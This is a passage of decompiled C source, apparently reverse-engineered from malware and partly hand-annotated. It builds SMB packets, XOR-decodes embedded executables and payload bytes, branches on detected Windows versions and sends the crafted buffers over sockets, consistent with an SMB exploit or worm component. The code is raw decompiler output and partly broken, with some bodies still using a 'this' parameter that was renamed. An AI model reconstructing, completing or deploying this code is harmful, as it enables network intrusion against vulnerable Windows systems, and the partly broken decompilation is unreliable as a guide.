BOOL __stdcall Dummy_StackSettup(__int64 a1) // remove?
{
	return (a1 + 0xFFFFFFFFFFFi64) <= 0xFFEFFFFFFFEi64;
}

//----- (681F20B2) --------------------------------------------------------
signed int CheckIfTimePassed()
{
	signed int result; // eax

	result = (GetTickCount() + dword_6820FB48 + 64);
	if (!result)
		result = 64;
	return result;
}
// 6820FB48: using guessed type int dword_6820FB48;

//----- (681F20D0) --------------------------------------------------------
BOOL  GetAndFreeHeap(BOOL *a1) //remove?
{
	BOOL result; // eax
	void *v2; // ST08_4
	HANDLE v3; // eax

	result = *a1;
	if (*a1)
	{
		v2 = *a1;
		v3 = GetProcessHeap();
		result = HeapFree(v3, 8u, v2);
		*a1 = 0;
	}
	return result;
}

//----- (681F20EA) --------------------------------------------------------
int  Unk_FindResourceAndIterate(int a1, __m64 mm0_0, __m64 mm1_0, _DWORD *a2, int a3, char a4)
{
	unsigned int v6; // edi
	HRSRC v7; // eax
	int v8; // eax
	_DWORD *v10; // ebx
	int v11; // ecx
	LPVOID v12; // eax
	unsigned int v13; // eax
	char v14; // [esp+8h] [ebp-4h]

	v6 = 0;
	v14 = byte_6820F8FC;
	if (byte_6820F8FC)
	{
		v10 = a2;
	}
	else
	{
		v7 = FindResourceW(Src, 4, 0xA);
		if (v7)
			v8 = LoadAndLock(a1, mm0_0, mm1_0, a2, v7);
		else
			v8 = 0;
		if (!v8)
			return -1;
		v10 = a2;
		v11 = *a2;
		if (*a2 != 1)
		{
			do
			{
				*(*a1 + v6) ^= 0x86868686;
				v6 += 4;
			} while (v6 < v11 - 1);
		}
		*(*a1 + v11 - 1) ^= 0x86u;
		*(*a1 + 1425) = a3 + 3440;
		if (a4 == 2)
		{
			*(*a1 + 38) = -96;
			*(*a1 + 82) = -112;
			*(*a1 + 624) = 356;
			*(*a1 + 670) = 0;
			*(*a1 + 694) = 0;
		}
		if (a4 == 3)
		{
			*(*a1 + 38) = -112;
			*(*a1 + 82) = -128;
			*(*a1 + 624) = 88;
			*(*a1 + 694) = 0;
		}
		if (a4 != 4 && a4 != 6)
			return 0;
		*(*a1 + 38) = 120;
		*(*a1 + 82) = 104;
		*(*a1 + 624) = 104;
	}
	if (v14 == 1)
	{
		*v10 = 6136;
		v12 = CreateHeap(0x17F8u);
		*a1 = v12;
		if (!v12)
			return -1;
		if (v6 < *v10 - 1)
		{
			v13 = *v10 - 1;
			do
			{
				*(v6 + *a1) = WhatIsThisP2L6136[v6 / 4] ^ 0x64646464;
				v6 += 4;
			} while (v6 < v13);
		}
		*(*a1 + 2158) = a3 + 3978;
		if (a4 == 2 || a4 == 3)
		{
			*(*a1 + 2118) = 688;
			*(*a1 + 2130) = 656;
			*(*a1 + 2134) = -112;
			*(*a1 + 2142) = 0;
		}
		if (a4 == 4 || a4 == 6)
		{
			*(*a1 + 2118) = 640;
			*(*a1 + 2130) = 608;
			*(*a1 + 2134) = -112;
		}
	}
	return 0;
}
// 6820F8FC: using guessed type char byte_6820F8FC;

//----- (681F22A2) --------------------------------------------------------
char  Unk_SockChecks(int a1, unsigned __int16 a2)
{
	unsigned int v3; // ecx
	int v4; // edx
	int v5; // ecx
	int v6; // edx
	int v7; // edx
	unsigned int v8; // esi
	int v9; // edx
	int v10; // ecx
	int v11; // ecx
	int v12; // esi
	int v13; // edx
	int v14; // ecx
	int v15; // edx
	int v16; // edx
	int v17; // ecx
	unsigned int v18; // [esp+4h] [ebp-8h]
	char v19; // [esp+Bh] [ebp-1h]
	int v20; // [esp+14h] [ebp+8h]

	v19 = -1;
	if (a2 < 0x2Du)
		return -1;
	v3 = *(a1 + 43);
	if (v3 < 8)
		return -1;
	if (a2 < (v3 + 45))
		return -1;
	v20 = 0;
	v18 = v3 - 8;
	if (v3 != 8)
	{
		v4 = 0;
		while (1)
		{
			v5 = *(v4 + a1 + 45);
			v6 = *(v4 + a1 + 49);
			if (3473440 == v5 && !(v6 ^ 0x31002E))
				goto LABEL_34;
			if (3473440 == v5 && !(v6 ^ 0x32002E))
				return 3;
			if (v5 == 6881366 && !(v6 ^ 0x740073))
				return 4;
			if (v5 == 7536759 && !(v6 ^ 0x370020))
				return 5;
			v7 = v6 ^ 0x380030;
			if (!(v5 ^ 0x300032) && !v7)
			{
				v12 = 0;
				v19 = 6;
				v13 = 0;
				while (1)
				{
					v14 = *(v13 + a1 + 45);
					v15 = *(v13 + a1 + 49) ^ 0x320052;
					if (!(v14 ^ 0x200038) && !v15)
						break;
					v13 = ++v12;
					if (v12 >= v18)
						return v19;
				}
				return 7;
			}
			v4 = ++v20;
			if (v20 >= v18)
			{
				v3 = *(a1 + 43);
				break;
			}
		}
	}
	v8 = v3 - 4;
	v9 = 0;
	if (v3 != 4)
	{
		v10 = 0;
		while (1)
		{
			v11 = *(v10 + a1 + 45);
			if (v11 == 825111840)
				break;
			switch (v11)
			{
			case 841889056:
				return 3;
			case 1953720662:
				return 4;
			case 924873591:
				return 5;
			}
			if (!(v11 ^ 0x38303032))
			{
				v16 = 0;
				v19 = 6;
				v17 = 0;
				while (*(v17 + a1 + 45) ^ 0x32522038)
				{
					v17 = ++v16;
					if (v16 >= v8)
						return v19;
				}
				return 7;
			}
			v10 = ++v9;
			if (v9 >= v8)
				return v19;
		}
	LABEL_34:
		v19 = 2;
	}
	return v19;
}

//----- (681F243F) --------------------------------------------------------
int  SockreceivData(__int16 *a1, SOCKET s, char a3, char a4)
{
	int v5; // [esp+4h] [ebp-4h]

	v5 = 4096;
	//return -(SockGetData(&a4, a1, s, a3, &v5) != 0); // origional
	return -(SockGetData(a4, a1, s, a3, &v5) != 0);
}

//----- (681F2466) --------------------------------------------------------
_WORD *__stdcall Unk_SetIpAddress(__int16 a1, char a2, __int16 a3, __int16 a4, __int16 a5, __int16 a6, __int16 a7, __int16 a8)
{
	_WORD *result; // eax
	_WORD *v9; // esi

	result = CreateHeap(0x24u);
	v9 = result;
	if (result)
	{
		result[1] = htons(a1 - 4);
		*(v9 + 8) = a2;
		v9[7] = a3;
		v9[8] = a4;
		v9[14] = a5;
		v9[15] = a6;
		v9[16] = a7;
		v9[17] = a8;
		*(v9 + 1) = 1112364031;
		*(v9 + 13) = 24;
		result = v9;
	}
	return result;
}

//----- (681F24D0) --------------------------------------------------------
char *__fastcall sub_681F24D0(int a1, _WORD *a2, void *Src)
{
	char *result; // eax
	char *v4; // esi

	if (!Src)
		return 0;
	*a2 = 1048;
	result = CreateHeap(0x418u);
	v4 = result;
	if (result)
	{
		*(result + 1) = 30;
		*(result + 3) = 30;
		*(result + 5) = 30;
		*result = 276;
		*(result + 2) = 66512;
		*(result + 6) = 75;
		*(result + 7) = 976;
		*(result + 8) = 104;
		result[36] = 1;
		*(result + 41) = 1004;
		memcpy(result + 44, Src, 0x3ECu);
		result = v4;
	}
	return result;
}

//----- (681F2547) --------------------------------------------------------
_WORD * sub_681F2547(_WORD *a1, __int16 a2, __int16 a3, __int16 a4, __int16 a5, _WORD *a6)
{
	_WORD *v6; // esi
	_BYTE *v7; // eax
	int v8; // ecx
	_WORD *v9; // edi
	_WORD *result; // eax
	__int16 v11; // ST1C_2
	unsigned __int16 v12; // bx
	__int16 v13; // ax
	char *v14; // eax
	int v15; // [esp+8h] [ebp-Ch]
	void *Src; // [esp+Ch] [ebp-8h]
	_BYTE *v17; // [esp+10h] [ebp-4h]
	_WORD *v18; // [esp+28h] [ebp+14h]

	v6 = a1;
	v7 = CreateHeap(0x3ECu);
	v9 = 0;
	v17 = v7;
	if (!v7)
		return 0;
	v7[30] = 1;
	v15 = 0;
	Src = sub_681F24D0(v8, &v15, v7);
	if (!Src)
	{
		GetAndFreeHeap(&v17);
		return 0;
	}
	v11 = a6;
	v12 = v15;
	v13 = v15 + 36;
	*v6 = v15 + 36;
	a6 = Unk_SetIpAddress(v13, 160, 49159, a2, a3, a4, a5, v11);
	if (a6)
	{
		v14 = CreateHeap(*v6);
		v18 = v14;
		if (v14)
		{
			qmemcpy(v14, a6, 0x24u);
			memcpy(v14 + 36, Src, v12);
			v9 = v18;
		}
		GetAndFreeHeap(&Src);
		GetAndFreeHeap(&v17);
		GetAndFreeHeap(&a6);
		result = v9;
	}
	else
	{
		GetAndFreeHeap(&Src);
		GetAndFreeHeap(&v17);
		result = 0;
	}
	return result;
}

//----- (681F2620) --------------------------------------------------------
_BYTE *__stdcall Unk_ReturnByteArrayOfUnk_Exe(__int16 a1, __int16 a2, __int16 a3, __int16 a4, __int16 a5, _WORD *a6)
{
	_BYTE *result; // eax
	_DWORD *v7; // ebx
	signed int v8; // ecx
	char *v9; // eax
	int v10; // ebx
	_WORD *v11; // edi
	_WORD *v12; // esi
	LPVOID v13; // eax
	_BYTE *v14; // edi
	int v15; // [esp+4h] [ebp-8h]
	_BYTE *v16; // [esp+8h] [ebp-4h]

	result = CreateHeap(0xCu);
	v7 = result;
	v16 = result;
	if (result)
	{
		qmemcpy(result, "bHbGcDiHpY`", 11);
		v8 = 11;
		do
		{
			*result++ ^= 0x2Bu;
			--v8;
		} while (v8);
		v9 = CreateHeap(0x11u);
		if (v9)
		{
			*(v9 + 1) = 1;
			*v9 = 1;
			*(v9 + 3) = 12;
			*(v9 + 5) = *v7;
			*(v9 + 9) = v7[1];
			*(v9 + 13) = v7[2];
			v10 = v9;
		}
		else
		{
			v10 = 0;
		}
		v15 = v10;
		if (!v10)
			goto LABEL_10;
		v11 = a6;
		*a6 = 53;
		v12 = Unk_SetIpAddress(53, 43, 49159, a1, a2, a3, a4, a5);
		a6 = v12;
		if (!v12)
		{
			GetAndFreeHeap(&v15);
		LABEL_10:
			GetAndFreeHeap(&v16);
			return 0;
		}
		v13 = CreateHeap(*v11);
		if (v13)
		{
			qmemcpy(v13, v12, 0x24u);
			*(v13 + 9) = *v10;
			*(v13 + 10) = *(v10 + 4);
			*(v13 + 11) = *(v10 + 8);
			*(v13 + 12) = *(v10 + 12);
			*(v13 + 52) = *(v10 + 16);
			v14 = v13;
		}
		else
		{
			v14 = 0;
		}
		GetAndFreeHeap(&v15);
		GetAndFreeHeap(&v16);
		GetAndFreeHeap(&a6);
		result = v14;
	}
	return result;
}

//----- (681F270A) --------------------------------------------------------
_BYTE * ProcessHeaps_1(_WORD *a1, __int16 a2, __int16 a3, __int16 a4, _WORD *a5)
{
	_WORD *v5; // ebx
	_BYTE *result; // eax
	_BYTE *v7; // edi
	_BYTE *v8; // eax
	signed int v9; // ecx
	char *v10; // eax
	void *v11; // esi
	__int16 v12; // ST1C_2
	_WORD *v13; // esi
	char *v14; // ebx
	void *v15; // [esp+8h] [ebp-Ch]
	void *Src; // [esp+Ch] [ebp-8h]
	_BYTE *v17; // [esp+10h] [ebp-4h]

	v5 = a1;
	result = CreateHeap(0x62u);
	v7 = result;
	v17 = result;
	if (result)
	{
		memcpy(result, &SomeExe1[10928], 0x62u);
		v8 = v7;
		v9 = 98;
		do
		{
			*v8++ ^= 0x72u;
			--v9;
		} while (v9);
		v10 = CreateHeap(0x65u);
		v11 = v10;
		if (v10)
		{
			*(v10 + 1) = 98;
			memcpy(v10 + 3, v7, 0x62u);
			Src = v11;
		}
		else
		{
			Src = 0;
		}
		v15 = Src;
		if (!Src)
			goto LABEL_10;
		v12 = a5;
		*v5 = 137;
		v13 = Unk_SetIpAddress(137, 114, a2, a3, 0, a4, 0, v12);
		a5 = v13;
		if (!v13)
		{
			GetAndFreeHeap(&v15);
		LABEL_10:
			GetAndFreeHeap(&v17);
			return 0;
		}
		v14 = CreateHeap(*v5);
		if (v14)
		{
			qmemcpy(v14, v13, 0x24u);
			memcpy(v14 + 36, Src, 0x65u);
		}
		GetAndFreeHeap(&v15);
		GetAndFreeHeap(&v17);
		GetAndFreeHeap(&a5);
		result = v14;
	}
	return result;
}

//----- (681F2802) --------------------------------------------------------
char * CreateHeapAndMalloc(_WORD *a1, unsigned __int16 a2, void *Src, char a4, __int16 a5, __int16 a6)
{
	char *result; // eax
	unsigned __int16 v7; // bx
	char *v8; // esi

	if (a2 && !Src)
		return 0;
	v7 = 27;
	if (a4 == 13)
		v7 = 29;
	*a1 = v7 + a2;
	result = CreateHeap((v7 + a2));
	v8 = result;
	if (result)
	{
		*(result + 5) = 4356;
		*(result + 7) = 10;
		*result = a4;
		result[1] = -1;
		*(result + 9) = a5;
		if (a4 == 12)
		{
			*(result + 21) = 2147483648;
			*(result + 25) = a2;
			*Src = a6;
		}
		if (a4 == 13)
		{
			*(result + 3) = 136;
			*(result + 15) = 1;
			*(result + 23) = 212;
			*(result + 27) = a2;
		}
		if (a2)
			memcpy(&result[v7], Src, a2);
		result = v8;
	}
	return result;
}

//----- (681F28B5) --------------------------------------------------------
_WORD * sub_681F28B5(char a1, __int16 a2, __int16 a3, __int16 a4, __int16 a5, BOOL a6, void *Src, _WORD *a8)
{
	char v8; // bl
	unsigned __int16 v10; // di
	void *v11; // eax
	_BYTE *v12; // eax
	signed int v13; // ecx
	unsigned __int16 v14; // bx
	_WORD *v15; // edi
	__int16 v16; // ax
	_WORD *v17; // esi
	_WORD *v18; // eax
	_WORD *v19; // edi
	int v20; // [esp+4h] [ebp-8h]
	void *v21; // [esp+8h] [ebp-4h]

	v8 = a1;
	if (a1 != 12 && a1 != 13)
		return 0;
	v10 = 0;
	v21 = 0;
	if (a1 == 12)
	{
		v10 = 22;
		v21 = CreateHeap(0x16u);
		if (!v21)
			return 0;
	}
	else if (a1 == 13)
	{
		v10 = 75;
		v11 = CreateHeap(0x4Bu);
		v21 = v11;
		if (!v11)
			return 0;
		memcpy(v11, SomeArray, 0x4Bu);
		v12 = v21;
		v13 = 75;
		do
		{
			*v12++ ^= 0x73u;
			--v13;
		} while (v13);
	}
	v20 = 0;
	Src = CreateHeapAndMalloc(&v20, v10, v21, v8, a6, Src);
	if (!Src)
	{
	LABEL_14:
		GetAndFreeHeap(&v21);
		return 0;
	}
	v14 = v20;
	v15 = a8;
	v16 = v20 + 36;
	*a8 = v20 + 36;
	v17 = Unk_SetIpAddress(v16, 115, a2, a3, 0, a4, 0, a5);
	a6 = v17;
	if (!v17)
	{
		GetAndFreeHeap(&Src);
		goto LABEL_14;
	}
	v18 = CreateHeap(*v15);
	a8 = v18;
	if (v18)
	{
		qmemcpy(v18, v17, 0x24u);
		memcpy(v18 + 18, Src, v14);
		v19 = a8;
	}
	else
	{
		v19 = 0;
	}
	GetAndFreeHeap(&Src);
	GetAndFreeHeap(&v21);
	GetAndFreeHeap(&a6);
	return v19;
}

//----- (681F29CE) --------------------------------------------------------
_BYTE * sub_681F29CE(_WORD *a1, __int16 a2, __int16 a3, __int16 a4, _WORD *a5)
{
	_WORD *v5; // ebx
	_BYTE *AllocatedMemory; // eax
	_BYTE *v7; // edi
	_BYTE *v8; // eax
	signed int v9; // ecx
	_WORD *v10; // eax
	void *v11; // esi
	__int16 v12; // ST1C_2
	_WORD *v13; // esi
	char *v14; // ebx
	void *v15; // [esp+8h] [ebp-Ch]
	void *Src; // [esp+Ch] [ebp-8h]
	_BYTE *v17; // [esp+10h] [ebp-4h]

	v5 = a1;
	AllocatedMemory = CreateHeap(0x2Du);
	v7 = AllocatedMemory;
	v17 = AllocatedMemory;
	if (AllocatedMemory)
	{
		memcpy(AllocatedMemory, CoppiedValueL46P1, 0x2Du);
		v8 = v7;
		v9 = 45;
		do
		{
			*v8++ ^= 0x75u;
			--v9;
		} while (v9);
		v10 = CreateHeap(0x38u);
		v11 = v10;
		if (v10)
		{
			*(v10 + 3) = 88;
			*(v10 + 5) = 8;
			*(v10 + 7) = 1;
			*(v10 + 9) = 45;
			*v10 = -252;// hex value?
			memcpy(v10 + 11, v7, 0x2Du);
			Src = v11;
		}
		else
		{
			Src = 0;
		}
		v15 = Src;
		if (!Src)
			goto LABEL_10;
		v12 = a5;
		*v5 = 92;
		v13 = Unk_SetIpAddress(92, 117, 49159, a2, 0, a3, a4, v12);
		a5 = v13;
		if (!v13)
		{
			GetAndFreeHeap(&v15);
		LABEL_10:
			GetAndFreeHeap(&v17);
			return 0;
		}
		v14 = CreateHeap(*v5);
		if (v14)
		{
			qmemcpy(v14, v13, 0x24u);
			memcpy(v14 + 36, Src, 0x38u);
		}
		GetAndFreeHeap(&v15);
		GetAndFreeHeap(&v17);
		GetAndFreeHeap(&a5);
		AllocatedMemory = v14;
	}
	return AllocatedMemory;
}

//----- (681F2ADF) --------------------------------------------------------
char * sub_681F2ADF(_WORD *a1, __int16 a2, __int16 a3, char a4, char a5)
{
	__int16 v5; // di
	__int16 v6; // si
	char *result; // eax
	signed int v8; // edi
	char *v9; // esi
	char *v10; // ecx
	char v11; // dl

	v5 = a3;
	v6 = a2;
	*a1 = 35;
	if (a4 == 2)
		*a1 = 42;
	if (a4 == 3)
		*a1 += 89;
	result = CreateHeap(*a1);
	if (result)
	{
		*result = 16;
		result[27] = 2;
		if (a4 == 1)
		{
			*(result + 3) = 1;
			*(result + 7) = 1;
			*(result + 29) = 35;
			*(result + 5) = v6;
			*(result + 13) = 4096;
			*(result + 31) = v5;
		}
		if (!a4)
		{
			*(result + 13) = 1;
			*(result + 3) = v6;
			*(result + 29) = 54;
			*(result + 31) = v5;
		}
		if (a4 == 2)
		{
			*(result + 21) = 74;
			*(result + 25) = 74;
			*(result + 33) = 7;
			*(result + 35) = 20572;
			*(result + 37) = 20553;
			*(result + 5) = v6;
			*(result + 7) = v6;
			*(result + 29) = 35;
			*(result + 39) = 23621;
		}
		if (a4 == 3)
		{
			*(result + 7) = 4096;
			*(result + 11) = 8;
			*(result + 23) = 72;
			*(result + 31) = v5;
			*(result + 29) = 38;
			v8 = 89;
			*(result + 21) = v6;
			*(result + 25) = v6;
			*(result + 33) = 89;
			*(result + 3) = 72;
			*(result + 13) = 1000;
			v9 = FormatsCharArrayL96P1;
			v10 = result + 35;
			do
			{
				v11 = *v9++ ^ 0x25;
				*v10++ = v11;
				--v8;
			} while (v8);
			if (!a5)
			{
				*(result + 21) = 305420152;
				*(result + 22) = -1412623820;
				*(result + 23) = 587268335;
				*(result + 24) = -1417058491;
			}
		}
	}
	return result;
}

//----- (681F2C1E) --------------------------------------------------------
char *__fastcall sub_681F2C1E(__int16 cx0, __int16 dx0, int a1, int a2, int a3, int a4, int a5, int a6, int a7, int a8, void *Src)
{
	_WORD *v11; // esi
	char *result; // eax
	unsigned __int16 v13; // bx
	__int16 v14; // ax
	BOOL *v15; // esi
	char *v16; // eax
	int v17; // [esp+4h] [ebp-4h]
	char *v18; // [esp+28h] [ebp+20h]

	v17 = 0;
	v11 = Src;
	result = sub_681F2ADF(&v17, dx0, cx0, a7, a8);
	Src = result;
	if (result)
	{
		v13 = v17;
		v14 = v17 + 36;
		*v11 = v17 + 36;
		a8 = Unk_SetIpAddress(v14, 37, a1, a2, a3, a4, a5, a6);
		if (!a8)
		{
			v15 = &Src;
		LABEL_6:
			GetAndFreeHeap(v15);
			return 0;
		}
		v16 = CreateHeap(*v11);
		v18 = v16;
		if (!v16)
		{
			GetAndFreeHeap(&Src);
			v15 = &a8;
			goto LABEL_6;
		}
		qmemcpy(v16, a8, 0x24u);
		memcpy(v16 + 36, Src, v13);
		GetAndFreeHeap(&a8);
		GetAndFreeHeap(&Src);
		result = v18;
	}
	return result;
}

//----- (681F2CCF) --------------------------------------------------------
//char *__thiscall sub_681F2CCF(void *this, int a2, int a3, void *Src, int a5)
char *__thiscall sub_681F2CCF(void *a1, int a2, int a3, void *Src, int a5)

{
	char *result; // eax
	char *v6; // ebx

	if (a5 && !Src || !a3)
		return 0;
	*this = a5 + 46;
	result = CreateHeap((a5 + 46));
	v6 = result;
	if (result)
	{
		*(result + 19) = 12;
		*(result + 1) = 12;
		*(result + 21) = 66;
		*(result + 25) = 78;
		*(result + 5) = 1;
		*(result + 31) = a5 + 13;
		*(result + 29) = 14;
		*result = 15;
		*(result + 13) = a2;
		result[27] = 1;
		*(result + 34) = *a3;
		*(result + 38) = *(a3 + 4);
		*(result + 42) = *(a3 + 8);
		if (a5 > 0u)
		{
			*(result + 3) = a5;
			*(result + 13) = a2;
			*(result + 23) = a5;
		}
		if (a5)
			memcpy(result + 46, Src, a5);
		result = v6;
	}
	return result;
}

//----- (681F2D82) --------------------------------------------------------
//_WORD *__thiscall sub_681F2D82(void *this, char a2)
_WORD *__thiscall sub_681F2D82(void *a1, char a2)
{
	signed __int16 v2; // di
	unsigned __int16 v3; // si
	_WORD *result; // eax
	unsigned __int8 v5; // dl
	unsigned __int16 i; // cx
	int v7; // ecx
	char v8; // bl
	char *v9; // [esp+Ch] [ebp-4h]

	v2 = 0;
	v3 = 0;
	v9 = 0;
	if (!a2)
	{
		v3 = 15;
		v9 = SomeValueL16P1;
		v2 = 12;
	}
	if (a2 == 1)
	{
		v3 = 17;
		v9 = &SomeExe1[11028];
		v2 = 14;
	}
	*this = v3 + 51;
	result = CreateHeap((v3 + 51));
	if (result)
	{
		*(result + 3) = 98;
		v5 = 0;
		*result = 65304;                            // This was -232 . I doubt that a counter would contain a negative number. Jugding from how this for loop is done it looks like a 2D array.
		result[3] = v2;
		*(result + 2) = 22;
		*(result + 4) = 131487;
		*(result + 8) = 3;
		*(result + 9) = 1;
		*(result + 10) = 64;
		*(result + 11) = 2;
		*(result + 48) = 3;
		*(result + 49) = v3;
		for (i = 0; i < v3; i = v5)
		{
			v7 = v5;
			v8 = v9[v5++] ^ 0xA2;
			*(result + v7 + 51) = v8;
		}
	}
	return result;
}

//----- (681F2E30) --------------------------------------------------------
char * sub_681F2E30(_WORD *a1, unsigned __int16 a2, char a3, __int16 a4, void *Src)
{
	char *result; // eax
	char *v6; // esi

	if (a2 && !Src)
		return 0;
	*a1 = a2 + 32;
	if (a3 == 12)
		*a1 = a2 + 28;
	result = CreateHeap(*a1);
	v6 = result;
	if (result)
	{
		*(result + 11) = -1;
		*result = a3;
		result[1] = -1;
		*(result + 5) = a4;
		if (a3 == 12)
		{
			*(result + 3) = 60;
			*(result + 15) = 4;
			*(result + 17) = -512;
			*(result + 21) = a2;
			*(result + 23) = 59;
			*(result + 25) = a2;
		}
		if (a3 == 14)
		{
			*(result + 3) = 64;
			*(result + 15) = 8;
			*(result + 23) = 64;
			*(result + 17) = a2;
			*(result + 21) = a2;
			*(result + 29) = a2 + 1;
		}
		if (a2)
			memcpy(&result[*a1 - a2], Src, a2);
		result = v6;
	}
	return result;
}

//----- (681F2EF5) --------------------------------------------------------
signed int  SockSendRecvDataFreeHeap(SOCKET a1, __int16 a2, LPVOID a3, int a4, _WORD *a5)
{
	SOCKET v5; // ebx
	signed int result; // eax
	char *v7; // edi
	signed int v8; // edi
	int v9; // [esp+4h] [ebp-4h]

	v9 = 0;
	v5 = a1;
	a5 = ProcessHeaps_1(&v9, a2, a3, a4, a5);
	if (!a5)
		return -1;
	v7 = CreateHeap(0x1000u);
	a3 = v7;
	if (v7)
	{
		a4 = 0;
		if (SockSendBuffer(v5, a5, v9) || SockreceivData(&a4, v5, 1, v7))
			v8 = -1;
		else
			v8 = *(v7 + 9);
		GetAndFreeHeap(&a3);
		GetAndFreeHeap(&a5);
		result = v8;
	}
	else
	{
		GetAndFreeHeap(&a5);
		result = -1;
	}
	return result;
}

//----- (681F2F88) --------------------------------------------------------
signed int  SockProcessSendRecv_2(SOCKET a1, __int16 a2, __int16 a3, __int16 a4, _WORD *a5, LPVOID a6, char *a7, int a8, void *a9, _DWORD *a10, _WORD *a11)
{
	SOCKET v11; // ebx
	signed int result; // eax
	char *v13; // edi
	int v14; // edi
	__int16 v15; // bx
	SIZE_T v16; // esi
	void *v17; // eax
	int v18; // [esp+4h] [ebp-4h]

	v18 = 0;
	v11 = a1;
	a7 = sub_681F28B5(a7, a2, a3, a4, a6, a8, a9, &v18);
	if (!a7)
		return -1;
	v13 = CreateHeap(0x1000u);
	a6 = v13;
	if (v13)
	{
		a9 = 0;
		if (SockSendBuffer(v11, a7, v18) || SockreceivData(&a9, v11, 1, v13))
		{
			v14 = -1;
		}
		else
		{
			v15 = a9;
			v16 = a9;
			*a5 = *(v13 + 16);
			a8 = *(v13 + 9);
			v17 = CreateHeap(v16);
			*a10 = v17;
			if (v17)
			{
				*a11 = v15;
				memcpy(v17, v13, v16);
			}
			else
			{
				a8 = -1;
			}
			v14 = a8;
		}
		GetAndFreeHeap(&a6);
		GetAndFreeHeap(&a7);
		result = v14;
	}
	else
	{
		GetAndFreeHeap(&a7);
		result = -1;
	}
	return result;
}

//----- (681F3061) --------------------------------------------------------
signed int  sub_681F3061(SOCKET a1, __int16 a2, _WORD *a3, LPVOID a4, int a5, char *a6)
{
	SOCKET v6; // ebx
	signed int result; // eax
	char *v8; // edi
	signed int v9; // edi
	__int16 v10; // ax
	int v11; // [esp+4h] [ebp-4h]

	v11 = 0;
	v6 = a1;
	a6 = sub_681F29CE(&v11, a2, a4, a5, a6);
	if (!a6)
		return -1;
	v8 = CreateHeap(0x1000u);
	a4 = v8;
	if (v8)
	{
		a5 = 0;
		if (SockSendBuffer(v6, a6, v11) || SockreceivData(&a5, v6, 1, v8))
		{
			v9 = -1;
		}
		else
		{
			v10 = *(v8 + 14);
			v9 = *(v8 + 9);
			*a3 = v10;
		}
		GetAndFreeHeap(&a4);
		GetAndFreeHeap(&a6);
		result = v9;
	}
	else
	{
		GetAndFreeHeap(&a6);
		result = -1;
	}
	return result;
}

//----- (681F30FE) --------------------------------------------------------
int __stdcall SocketUseSocket1(SOCKET s, int a2, int a3, int a4, int a5, int a6)
{
	char *v6; // ebx
	int *v7; // esi
	char *v8; // eax
	_WORD *v9; // esi
	char *v11; // edi
	signed int v12; // edi
	unsigned __int16 v13; // [esp+Ch] [ebp-8h]
	_WORD *v14; // [esp+10h] [ebp-4h]

	v13 = 0;
	v14 = CreateHeap(3u);
	if (!v14)
		goto LABEL_2;
	v13 = 39;
	a6 = Unk_SetIpAddress(39, 113, 49159, a2, a3, a4, a5, a6);
	if (!a6)
	{
		v7 = &v14;
	LABEL_5:
		GetAndFreeHeap(v7);
	LABEL_2:
		v6 = 0;
		goto LABEL_9;
	}
	v8 = CreateHeap(0x27u);
	v6 = v8;
	if (!v8)
	{
		GetAndFreeHeap(&v14);
		v7 = &a6;
		goto LABEL_5;
	}
	qmemcpy(v8, a6, 0x24u);
	v9 = v14;
	*(v8 + 18) = *v14;
	v8[38] = *(v9 + 2);
	GetAndFreeHeap(&v14);
	GetAndFreeHeap(&a6);
LABEL_9:
	a6 = v6;
	if (!v6)
		return -1;
	v11 = CreateHeap(0x1000u);
	a4 = v11;
	if (!v11)
	{
		GetAndFreeHeap(&a6);
		return -1;
	}
	a5 = 0;
	if (SockSendBuffer(s, v6, v13) || SockreceivData(&a5, s, 1, v11))
		v12 = -1;
	else
		v12 = *(v11 + 9);
	GetAndFreeHeap(&a4);
	GetAndFreeHeap(&a6);
	return v12;
}

//----- (681F31FB) --------------------------------------------------------
int __stdcall SocketUseSocket2(SOCKET s, int a2, int a3, int a4, int a5, int a6)
{
	_WORD *v6; // eax
	char *v7; // ebx
	int *v8; // esi
	char *v9; // eax
	int v10; // esi
	char *v12; // edi
	signed int v13; // edi
	unsigned __int16 v14; // [esp+0h] [ebp-Ch]
	_DWORD *v15; // [esp+4h] [ebp-8h]
	_DWORD *v16; // [esp+8h] [ebp-4h]

	v14 = 0;
	v6 = CreateHeap(7u);
	if (v6)
	{
		*v6 = -254;
		v16 = v6;
	}
	else
	{
		v16 = 0;
	}
	v15 = v16;
	if (!v16)
		goto LABEL_5;
	v14 = 43;
	a6 = Unk_SetIpAddress(43, 116, 49159, a2, a3, a4, a5, a6);
	if (!a6)
	{
		v8 = &v15;
	LABEL_8:
		GetAndFreeHeap(v8);
	LABEL_5:
		v7 = 0;
		goto LABEL_12;
	}
	v9 = CreateHeap(0x2Bu);
	v7 = v9;
	if (!v9)
	{
		GetAndFreeHeap(&v15);
		v8 = &a6;
		goto LABEL_8;
	}
	qmemcpy(v9, a6, 0x24u);
	v10 = v16;
	*(v9 + 9) = *v16;
	v10 += 4;
	*(v9 + 20) = *v10;
	v9[42] = *(v10 + 2);
	GetAndFreeHeap(&v15);
	GetAndFreeHeap(&a6);
LABEL_12:
	a6 = v7;
	if (!v7)
		return -1;
	v12 = CreateHeap(0x1000u);
	a4 = v12;
	if (!v12)
	{
		GetAndFreeHeap(&a6);
		return -1;
	}
	a5 = 0;
	if (SockSendBuffer(s, v7, v14) || SockreceivData(&a5, s, 1, v12))
		v13 = -1;
	else
		v13 = *(v12 + 9);
	GetAndFreeHeap(&a4);
	GetAndFreeHeap(&a6);
	return v13;
}

//----- (681F330E) --------------------------------------------------------
int __stdcall sub_681F330E(SOCKET s, int a2, int a3, int a4, int a5, int a6, int a7, int a8, void *Src, int a10, int a11, int a12, int a13)
{
	SIZE_T v13; // ebx
	void *v14; // esi
	_WORD *v15; // esi
	BOOL *v16; // esi
	char *v17; // eax
	char *v19; // edi
	size_t v20; // esi
	signed int v21; // ebx
	void *v22; // eax
	int v23; // [esp+Ch] [ebp-4h]
	int v24; // [esp+30h] [ebp+20h]

	LOWORD(v13) = 0;
	v23 = 0;
	Src = sub_681F2CCF(&v23, a7, a8, Src, a10);
	if (!Src)
		goto LABEL_2;
	v13 = (v23 + 36);
	v15 = Unk_SetIpAddress(v23 + 36, 50, 49159, a2, a3, a4, a5, a6);
	a8 = v15;
	if (!v15)
	{
		v16 = &Src;
	LABEL_5:
		GetAndFreeHeap(v16);
	LABEL_2:
		v14 = 0;
		goto LABEL_9;
	}
	v17 = CreateHeap(v13);
	v24 = v17;
	if (!v17)
	{
		GetAndFreeHeap(&Src);
		v16 = &a8;
		goto LABEL_5;
	}
	qmemcpy(v17, v15, 0x24u);
	memcpy(v17 + 36, Src, v23);
	GetAndFreeHeap(&Src);
	GetAndFreeHeap(&a8);
	v14 = v24;
